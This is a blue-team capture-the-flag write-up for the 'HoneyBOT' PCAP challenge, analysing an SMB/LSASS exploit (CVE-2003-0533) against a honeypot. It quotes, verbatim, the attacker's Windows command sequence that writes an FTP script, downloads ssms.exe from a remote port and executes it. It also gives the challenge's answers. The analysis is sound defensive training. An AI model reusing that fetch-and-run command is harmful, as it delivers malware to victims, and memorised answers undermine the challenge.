HoneyBOT (CyberDefenders)

Scenario

A PCAP analysis exercise highlighting attacker's interactions with honeypots and how automatic exploitation works.. (Note that the IP address of the victim has been changed to hide the true location.)

As a soc analyst, analyze the artifacts and answer the questions.

https://cyberdefenders.org/blueteam-ctf-challenges/honeybot/

1- What is the attacker's IP address?

98.114.205.102

We were initially given two IPs (one internal, one external) and i tried the external IP and it worked yaaay , but that’s not a good way to answer. To validate the finding properly, I inspected the first packets in the capture.

The connection was initiated by 98.114.205.102 sending a TCP SYN to 192.150.11.111:445 (SMB). The victim replied with a SYN-ACK, and the attacker completed the three-way handshake with an ACK this confirms that 98.114.205.102 was the originator of the session. Subsequent packets show SMB traffic originating from that IP and accessing the IPC$ share, which is commonly targeted for information gathering and remote interaction. Seeing an SMB handshake followed by IPC$ activity strongly suggests automated scanning/exploitation attempts (

Putting it together: the packet-level evidence (SYN → SYN-ACK → ACK from 98.114.205.102 to 192.150.11.111:445, plus SMB/IPC$ activity) confirms 98.114.205.102 as the attacker IP

2- What is the target's IP address?

192.150.11.111

3- Provide the country code for the attacker's IP address (a.k.a geo-location).

US

4- How many TCP sessions are present in the captured traffic?

5

By navigating to Statistics > Conversations and selecting the TCP tab

5- How long did it take to perform the attack (in seconds)?

16

in Capture File Properties we can find the answer

or the 💀 way is to subtract the difference between the first and the last packet

6- Provide the CVE number of the exploited vulnerability.

CVE-2003-0533

I observed a DsRolerUpgradeDownlevelServer request in the capture (sent from 98.114.205.102 to 192.150.11.111), found by inspecting the Protocol Hierarchy and applying a dcerpc filter in Wireshark. The flow shows an RPC Bind followed by the DsRolerUpgradeDownlevelServer call, and the victim returned WERR_OK (0x00000000), indicating the operation completed successfully. A quick search for “DsRolerUpgradeDownlevelServer CVE” points to CVE-2003-0533, which describes a remote exploit impacting LSASS that can lead to remote code execution via malformed RPC/SMB requests. The observed DCE/RPC-over-SMB activity and successful remote call align with that vulnerability.

7- Which protocol was used to carry over the exploit?

SMB

8- Which protocol did the attacker use to download additional malicious files to the target system?

ftp

Answer — FTP

Following the TCP stream showed Windows command-line steps that build and run an FTP script named o:

text
echo open 0.0.0.0 8884 > o
echo user 1 1 >> o
echo get ssms.exe >> o
echo quit >> o
ftp -n -s:o
del /F /Q o & ssms.exe

This sequence creates an FTP script that connects to 0.0.0.0 on port 8884 (a non-standard FTP port), logs in with credentials 1 1, downloads ssms.exe, removes the script, and then executes the file. The presence of these commands in the TCP stream confirms the attacker used FTP (over a custom port) to retrieve and run an additional malicious payload.

9- What is the name of the downloaded malware?

ssms.exe

10- The attacker's server was listening on a specific port. Provide the port number.

8884

11- When was the involved malware first submitted to VirusTotal for analysis? Format: YYYY-MM-DD

2007-06-27

TCP Stream 4 contained the file; I saved the stream in Raw mode and calculated its MD5 (14a09a48ad23fe0ea5a180bee8cb750a). Looking up that hash on VirusTotal shows the malware was first submitted on 2007-06-27.

12- What is the key used to encode the shellcode?

0x99

13- What is the port number the shellcode binds to?

1957

14- The shellcode used a specific technique to determine its location in memory. What is the OS file being queried during this process?

kernel32.dll
